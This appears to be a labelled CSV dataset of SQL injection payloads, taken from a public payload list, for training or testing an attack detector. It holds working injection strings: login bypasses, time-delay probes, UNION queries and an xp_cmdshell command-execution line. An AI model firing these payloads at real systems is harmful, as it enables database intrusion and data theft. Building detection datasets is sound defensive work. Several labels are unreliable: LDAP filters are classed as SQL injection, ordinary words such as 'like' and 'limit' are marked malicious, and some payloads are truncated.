Payload,Signature,AttackType,Severity,MITRE,Label,Description
; execute immediate 'sel' || 'ect us' || 'er',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
update,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""";waitfor delay '0:0:__TIME__'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1) or pg_sleep(__TIME__)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"hi"""""""") or (""""""""a""""""""=""""""""a""""""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
delete,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
like,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or sleep(__TIME__)#",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
pg_sleep(__TIME__)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
*(|(objectclass=*)),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @q nvarchar (200) 0x730065006c00650063 ...,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 0=0 #,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
insert,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1) or sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) or ('a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
; exec xp_regread,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1 LIMIT 1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
@var select @var as var into temp end --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(||6),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"a"""""""" or 3=3--""""""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
# from wapiti,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 0=0 --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 waitfor delay '0:0:10'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 'a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"hi or 1=1 --""",SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or a = a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 UNION ALL SELECT,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) or sleep(__TIME__)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
hi' or 'a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
limit,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 2 > 1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
PRINT,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
hi') or ('a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 3=3,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
));waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
a' waitfor delay '0:0:10'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or%201=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 or sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 and 1 in (select var from temp)--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or '7659'='7659,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 'text' = n'text',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 1=1 or ''=',SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @s varchar (200) select @s = 0x73656c6 ...,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
exec xp,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
; exec master..xp_cmdshell 'ping 172.10.1.255'--,SQLInjection_Generic,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
3.10E+17,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
" or pg_sleep(__TIME__)--""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' AND email IS NULL; --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
admin' or ',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 'unusual' = 'unusual',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' UNION SELECT @@version--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
truncate,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
\x27UNION SELECT,SQLi_Keyword,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @s varchar(200) select @s = 0x77616974 ...,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
tz_offset,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
sqlvuln,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""));waitfor delay '0:0:__TIME__'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' ORDER BY 1--+,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or%201=1 --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%2A%28%7C%28objectclass%3D%2A%29%29,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or a=a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) union select * from information_schema.tables;,SQLi_Keyword,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
PRINT @@variable,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or isNULL(1/0) /*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
26 %,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
" or """"a""""=""""a""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(sqlvuln),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' AND members.email IS NULL; --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or 1=1--,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
0x770061006900740066006F0072002000640065006C00 ...,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%20'sleep%2050',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
admin'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1)) or pg_sleep(__TIME__)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
